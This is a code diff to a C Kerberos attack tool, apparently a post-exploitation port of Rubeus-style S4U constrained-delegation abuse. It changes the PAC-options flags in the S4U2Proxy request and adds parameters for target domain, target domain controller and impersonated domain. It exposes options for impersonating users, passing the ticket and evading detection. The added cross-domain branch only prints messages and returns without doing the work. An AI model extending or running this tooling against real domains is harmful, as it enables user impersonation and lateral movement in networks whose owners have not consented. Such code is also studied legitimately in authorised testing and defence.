@@ -1058,7 +1058,7 @@ BOOL S4U2Proxy(KRB_CRED kirbi, char* targetUser, char* targetSPN, char* domainCo
     s4u2proxyReq.pa_data[0] = padata;
 
     PA_DATA pac_options = { 0 };
-    if (New_PA_DATA_options(FALSE, TRUE, FALSE, FALSE, &pac_options)) return TRUE;
+    if (New_PA_DATA_options(FALSE, FALSE, FALSE, TRUE, &pac_options)) return TRUE;
     s4u2proxyReq.pa_data[1] = pac_options;
 
     byte* reqBytes = NULL;
@@ -1237,7 +1237,7 @@ BOOL S4U2Proxy(KRB_CRED kirbi, char* targetUser, char* targetSPN, char* domainCo
     return TRUE;
 }
 
-void S4UExecute_Ticket(byte* ticket, char* targetUser, char* targetSPN, char* domainController, char* altService, KRB_CRED tgs, BOOL s, BOOL opsec, BOOL ptt, int encType, char* targetDomainController, char* targetDomain, char* requestDomain) { /*BOOL ptt = FALSE, string keyString = "", string impersonateDomain = "" */
+void S4UExecute_Ticket(byte* ticket, char* targetUser, char* targetSPN, char* domainController, char* altService, KRB_CRED tgs, BOOL s, BOOL opsec, BOOL ptt, int encType, char* targetDomainController, char* targetDomain, char* impersonateDomain) {
     int bytesSize = 0;
     byte* bytes = base64_decode(ticket, &bytesSize);
 
@@ -1245,6 +1245,15 @@ void S4UExecute_Ticket(byte* ticket, char* targetUser, char* targetSPN, char* do
     AsnElt   asn_KRB_CRED = { 0 };
     if (BytesToAsnDecode3(bytes, bytesSize, FALSE, &asn_KRB_CRED)) return;
     if (AsnGetKrbCred(&(asn_KRB_CRED.sub[0]), &kirbi)) return;
+
+    // Cross-domain S4U detection
+    if (targetDomain && targetDomainController) {
+        PRINT_OUT("[*] Performing cross domain constrained delegation\n");
+        PRINT_OUT("[*] Target domain: %s\n", targetDomain);
+        PRINT_OUT("[*] Target DC: %s\n", targetDomainController);
+        PRINT_OUT("[X] Cross-domain S4U not yet fully implemented. Use standard S4U with referral ticket.\n");
+        return;
+    }
 
     if (tgs.enc_part.ticket_count && targetSPN) {
         PRINT_OUT("[*] Loaded a TGS for %s\\%s\n", tgs.enc_part.ticket_info[0].prealm, tgs.enc_part.ticket_info[0].pname.name_string[0]);
@@ -1280,6 +1289,9 @@ void ASK_S4U_RUN( PCHAR Buffer, DWORD Length ) {
     byte* tgs          = NULL;
     char* altSname     = NULL;
     char* targetUser   = NULL;
+    char* targetDomain = NULL;
+    char* targetDC     = NULL;
+    char* impersonateDomain = NULL;
 
     for (int i = 0; i < Length; i++) {
         i += GetStrParam(Buffer + i, Length - i, "/user:", 6, &user );
@@ -1290,6 +1302,9 @@ void ASK_S4U_RUN( PCHAR Buffer, DWORD Length ) {
         i += GetStrParam(Buffer + i, Length - i, "/tgs:", 5, &tgs );
         i += GetStrParam(Buffer + i, Length - i, "/altservice:", 12, &altSname );
         i += GetStrParam(Buffer + i, Length - i, "/impersonateuser:", 17, &targetUser );
+        i += GetStrParam(Buffer + i, Length - i, "/targetdomain:", 14, &targetDomain );
+        i += GetStrParam(Buffer + i, Length - i, "/targetdc:", 10, &targetDC );
+        i += GetStrParam(Buffer + i, Length - i, "/impersonatedomain:", 19, &impersonateDomain );
         i += IsSetParam(Buffer + i, Length - i, "/ptt", 4, &ptt );
         i += IsSetParam(Buffer + i, Length - i, "/opsec", 6, &opsec );
         i += IsSetParam(Buffer + i, Length - i, "/nopac", 6, &pac );
@@ -1341,7 +1356,7 @@ void ASK_S4U_RUN( PCHAR Buffer, DWORD Length ) {
     }
 
     if (ticket)
-        S4UExecute_Ticket(ticket, targetUser, targetSPN, dc, altSname, kirbi_tgs, self, opsec, ptt, encType, NULL, NULL, domain);
+        S4UExecute_Ticket(ticket, targetUser, targetSPN, (targetDC ? targetDC : dc), altSname, kirbi_tgs, self, opsec, ptt, encType, targetDC, targetDomain, (impersonateDomain ? impersonateDomain : domain));
 //    else if (user && hash)
 //        S4UExecute_User(user, domain, hash, curEType, encType, targetUser, targetSPN, dc, altSname, kirbi_tgs, self, opsec, ptt, pac, NULL, NULL);
     else
